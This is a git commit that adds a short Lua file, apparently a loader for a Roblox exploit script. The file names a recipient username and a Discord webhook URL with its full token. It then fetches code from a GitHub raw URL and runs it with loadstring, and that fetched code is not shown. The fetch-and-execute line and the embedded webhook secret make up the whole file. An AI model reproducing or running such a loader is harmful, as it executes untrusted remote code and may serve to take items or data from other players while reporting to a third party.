5144bbab5c04a2b9559f0593b4831a4fb11179b2
JBkingcode <115029210+JBkingcode@users.noreply.github.com>
2023-04-09 13:21:43 +0200

    Add files via upload

---
+++ w.lua
@@ -0,0 +1,4 @@
+UserName = "FrankErSej_6"
+Webhook = "https://discord.com/api/webhooks/1094342828261388328/V-AD5WDaHJhEPc-PZPB5hhhBnnDmL_R2nHQCQ0UCm374m74LtmYTr5BqDaqMcLF83Pet" -- optional delete the whole line if you don't want it
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
